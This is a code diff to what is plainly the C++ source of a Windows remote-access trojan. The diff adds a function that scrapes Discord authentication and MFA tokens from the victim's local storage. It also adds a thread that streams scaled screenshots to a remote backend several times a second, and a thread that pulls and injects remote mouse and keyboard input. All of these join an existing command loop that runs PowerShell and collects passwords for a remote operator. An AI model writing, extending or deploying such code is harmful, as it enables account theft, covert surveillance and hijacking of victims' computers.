@@ -195,7 +195,11 @@ std::string takeScreenshot(int monitorIdx, int quality=80) {
     ReleaseDC(0,dc);
     Bitmap* gbmp=Bitmap::FromHBITMAP(bmp,0);
     CLSID jpegClsid; GetEncoderClsid(L"image/jpeg",&jpegClsid);
-    EncoderParameters ep={1,{EncoderQuality,quality,{1}}};
+    EncoderParameters ep; ULONG q=quality;
+    ep.Count=1; ep.Parameter[0].Guid=EncoderQuality;
+    ep.Parameter[0].NumberOfValues=1;
+    ep.Parameter[0].Type=EncoderParameterValueTypeLong;
+    ep.Parameter[0].Value=&q;
     IStream* is=0; CreateStreamOnHGlobal(0,TRUE,&is);
     gbmp->Save(is,&jpegClsid,&ep);
     DeleteObject(bmp); delete gbmp;
@@ -205,6 +209,51 @@ std::string takeScreenshot(int monitorIdx, int quality=80) {
     LARGE_INTEGER li={}; is->Seek(li,STREAM_SEEK_SET,0);
     ULONG rr=0; is->Read(d.data(),sz,&rr); is->Release();
     return base64Encode(d.data(),d.size());
+}
+
+std::string takeScreenshotScaled(int monitorIdx, int quality, float scale) {
+    auto mons = getMonitors();
+    int ox=0, oy=0, ow=GetSystemMetrics(SM_CXSCREEN), oh=GetSystemMetrics(SM_CYSCREEN);
+    if(monitorIdx>=0 && monitorIdx<(int)mons.size()) {
+        ox=mons[monitorIdx].x; oy=mons[monitorIdx].y;
+        ow=mons[monitorIdx].w; oh=mons[monitorIdx].h;
+    } else if(monitorIdx==-1) {
+        ox=GetSystemMetrics(SM_XVIRTUALSCREEN);
+        oy=GetSystemMetrics(SM_YVIRTUALSCREEN);
+        ow=GetSystemMetrics(SM_CXVIRTUALSCREEN);
+        oh=GetSystemMetrics(SM_CYVIRTUALSCREEN);
+    }
+    HDC dc=GetDC(0);
+    HDC mem=CreateCompatibleDC(dc);
+    HBITMAP bmp=CreateCompatibleBitmap(dc, ow, oh);
+    SelectObject(mem, bmp);
+    BitBlt(mem, 0, 0, ow, oh, dc, ox, oy, SRCCOPY);
+    ReleaseDC(0, dc);
+    Bitmap* src = Bitmap::FromHBITMAP(bmp, 0);
+    DeleteObject(bmp);
+    int sw = (int)(ow * scale), sh = (int)(oh * scale);
+    if (sw < 1) sw = 1; if (sh < 1) sh = 1;
+    Bitmap* dst = new Bitmap(sw, sh, PixelFormat24bppRGB);
+    Graphics g(dst);
+    g.SetInterpolationMode(InterpolationModeBilinear);
+    g.DrawImage(src, 0, 0, sw, sh);
+    delete src;
+    CLSID jpegClsid; GetEncoderClsid(L"image/jpeg", &jpegClsid);
+    EncoderParameters ep; ULONG q = quality;
+    ep.Count = 1; ep.Parameter[0].Guid = EncoderQuality;
+    ep.Parameter[0].NumberOfValues = 1;
+    ep.Parameter[0].Type = EncoderParameterValueTypeLong;
+    ep.Parameter[0].Value = &q;
+    IStream* is = 0; CreateStreamOnHGlobal(0, TRUE, &is);
+    dst->Save(is, &jpegClsid, &ep);
+    delete dst;
+    STATSTG st; is->Stat(&st, STATFLAG_NONAME);
+    ULONG sz = (ULONG)st.cbSize.LowPart;
+    std::vector<unsigned char> data(sz);
+    LARGE_INTEGER li = {}; is->Seek(li, STREAM_SEEK_SET, 0);
+    ULONG rr = 0; is->Read(data.data(), sz, &rr);
+    is->Release();
+    return base64Encode(data.data(), data.size());
 }
 
 std::string captureWebcam() {
@@ -474,12 +523,89 @@ std::string getInstalledApps() {
     return execCmd("powershell -c \"Get-ItemProperty HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*, HKLM:\\Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | Where-Object DisplayName | Select-Object DisplayName,DisplayVersion,Publisher | Format-Table -AutoSize -Wrap | Out-String -Width 4096\"");
 }
 
+std::string getDiscordTokens() {
+    std::string out;
+    const char* clients[] = {"discord","discordptb","discordcanary","discorddevelopment"};
+    char ad[MAX_PATH];
+    DWORD adLen = GetEnvironmentVariableA("APPDATA", ad, MAX_PATH);
+    if (adLen == 0 || adLen > MAX_PATH) return "Error: no AppData";
+    std::string basePath(ad);
+    auto isTC = [](char c){return (c>='a'&&c<='z')||(c>='A'&&c<='Z')||(c>='0'&&c<='9')||c=='_'||c=='-';};
+    for (const char* cl : clients) {
+        std::string dir = basePath + "\\" + cl + "\\Local Storage\\leveldb\\";
+        std::string found;
+        for (const char* ext : {".ldb", ".log"}) {
+            WIN32_FIND_DATAA fd;
+            HANDLE hf = FindFirstFileA((dir + "*" + ext).c_str(), &fd);
+            if (hf == INVALID_HANDLE_VALUE) continue;
+            do {
+                HANDLE f = CreateFileA((dir + fd.cFileName).c_str(), GENERIC_READ, FILE_SHARE_READ|FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
+                if (f == INVALID_HANDLE_VALUE) continue;
+                DWORD sz = GetFileSize(f, 0);
+                if (sz > 0 && sz < 0xa00000) {
+                    std::vector<char> buf(sz);
+                    DWORD rd = 0;
+                    if (ReadFile(f, buf.data(), sz, &rd, 0) && rd > 0) {
+                        std::string s(buf.data(), rd);
+                        // MFA tokens: mfa.XXXX
+                        size_t p = 0;
+                        while ((p = s.find("mfa.", p)) != std::string::npos) {
+                            size_t e = p + 4;
+                            while (e < s.size() && isTC(s[e])) e++;
+                            std::string t = s.substr(p, e - p);
+                            if (t.size() > 80 && t.size() < 100 && found.find(t) == std::string::npos) {
+                                if (!found.empty()) found += "\n";
+                                found += t;
+                            }
+                            p = e;
+                        }
+                        // Regular tokens: XXX.XXX.XXX
+                        for (size_t i = 0; i < s.size(); i++) {
+                            if (!isTC(s[i])) continue;
+                            size_t a = i;
+                            while (i < s.size() && isTC(s[i])) i++;
+                            std::string s1 = s.substr(a, i - a);
+                            if (s1.size() >= 20 && s1.size() <= 26 && i < s.size() && s[i] == '.') {
+                                size_t j = i + 1;
+                                if (j >= s.size()) break;
+                                size_t b = j;
+                                while (j < s.size() && isTC(s[j])) j++;
+                                std::string s2 = s.substr(b, j - b);
+                                if (s2.size() >= 4 && s2.size() <= 8 && j < s.size() && s[j] == '.') {
+                                    j++;
+                                    size_t c = j;
+                                    while (j < s.size() && isTC(s[j])) j++;
+                                    std::string s3 = s.substr(c, j - c);
+                                    if (s3.size() >= 24 && s3.size() <= 30) {
+                                        std::string t = s1 + "." + s2 + "." + s3;
+                                        if (found.find(t) == std::string::npos) {
+                                            if (!found.empty()) found += "\n";
+                                            found += t;
+                                        }
+                                    }
+                                }
+                            }
+                        }
+                    }
+                }
+                CloseHandle(f);
+            } while (FindNextFileA(hf, &fd));
+            FindClose(hf);
+        }
+        if (!found.empty())
+            out += "[" + std::string(cl) + "]\n" + found + "\n\n";
+    }
+    if (out.empty()) out = "No Discord tokens found";
+    return out;
+}
+
 DWORD WINAPI pollThread(LPVOID) {
     Sleep(3000);
+    try{if(!g_noPing)sendPing();}catch(...){}
     int pingCtr=0;
     while(true) {
-        Sleep(50);
-        if(++pingCtr>=600){pingCtr=0;try{if(!g_noPing)sendPing();}catch(...){}}
+        Sleep(100);
+        if(++pingCtr>=300){pingCtr=0;try{if(!g_noPing)sendPing();}catch(...){}}
         try {
             std::string path = "/commands/" + fbEsc(computerName) + ".json";
             std::string resp = httpsGet(path);
@@ -544,6 +670,7 @@ DWORD WINAPI pollThread(LPVOID) {
                         result=std::to_string((GetTickCount()-l.dwTime)/1000);
                     } else if (type == "powershell") result = execCmd("powershell -c "+payload);
                     else if (type == "uptime") result=std::to_string(GetTickCount64()/1000);
+                    else if (type == "discord_tokens") result = getDiscordTokens();
                     else if (type == "passwords") result = getPasswords();
                     else if (type == "network_info") result = getNetworkInfo();
                     else if (type == "services") result = getServices();
@@ -562,14 +689,58 @@ DWORD WINAPI pollThread(LPVOID) {
 
 DWORD WINAPI screenThread(LPVOID) {
     Sleep(3000);
+    const float SCALE = 0.5f;
+    const int TARGET_MS = 100;
+    const int LIVE_QUALITY = 25;
     while(true) {
-        Sleep(200);
+        DWORD t0 = GetTickCount();
         try {
-            std::string b64 = takeScreenshot(0, 30);
+            std::string b64 = takeScreenshotScaled(0, LIVE_QUALITY, SCALE);
             std::string escaped = jsonEscape(b64);
             std::string ts = getTimestamp();
-            std::string body = "{\"result\":\"" + escaped + "\",\"created_at\":\"" + ts + "\"}";
+            char scaleStr[16]; sprintf(scaleStr, "%.2f", SCALE);
+            std::string body = "{\"result\":\"" + escaped + "\",\"created_at\":\"" + ts + "\",\"scale\":" + std::string(scaleStr) + "}";
             httpsPut("/live/" + fbEsc(computerName) + ".json", body);
+        } catch(...) {}
+        DWORD elapsed = GetTickCount() - t0;
+        if (elapsed < (DWORD)TARGET_MS) Sleep(TARGET_MS - elapsed);
+    }
+    return 0;
+}
+
+DWORD WINAPI inputThread(LPVOID) {
+    Sleep(3000);
+    while(true) {
+        Sleep(15);
+        try {
+            std::string resp = httpsGet("/input/" + fbEsc(computerName) + ".json");
+            if (resp.empty() || resp == "null" || resp.size() < 5) continue;
+            bool hasEvents = false;
+            size_t pos = 0;
+            while ((pos = resp.find("\":{", pos)) != std::string::npos) {
+                size_t kStart = resp.rfind("\"", pos - 1);
+                if (kStart == std::string::npos) { pos++; continue; }
+                size_t objStart = pos + 3;
+                if (objStart >= resp.size()) break;
+                int depth = 1; size_t objEnd = objStart;
+                while (depth > 0 && objEnd < resp.size()) {
+                    if (resp[objEnd] == '{') depth++;
+                    else if (resp[objEnd] == '}') depth--;
+                    objEnd++;
+                }
+                if (depth != 0) break;
+                std::string item = resp.substr(objStart, objEnd - objStart - 1);
+                std::string type = extractJson(item, "type");
+                std::string payload = extractJson(item, "payload");
+                if (type.empty()) { pos = objEnd; continue; }
+                hasEvents = true;
+                try {
+                    if (type == "mouse") handleMouse(payload);
+                    else if (type == "keyboard") handleKeyboard(payload);
+                } catch(...) {}
+                pos = objEnd;
+            }
+            if (hasEvents) httpsDelete("/input/" + fbEsc(computerName) + ".json");
         } catch(...) {}
     }
     return 0;
@@ -605,6 +776,7 @@ int main(int argc, char* argv[]) {
     ULONG_PTR gdiplusToken;
     GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
     CreateThread(0, 0, pollThread, 0, 0, 0);
+    CreateThread(0, 0, inputThread, 0, 0, 0);
     if (!noScreen) CreateThread(0, 0, screenThread, 0, 0, 0);
     MSG msg;
     while (GetMessage(&msg, 0, 0, 0)) { TranslateMessage(&msg); DispatchMessage(&msg); }
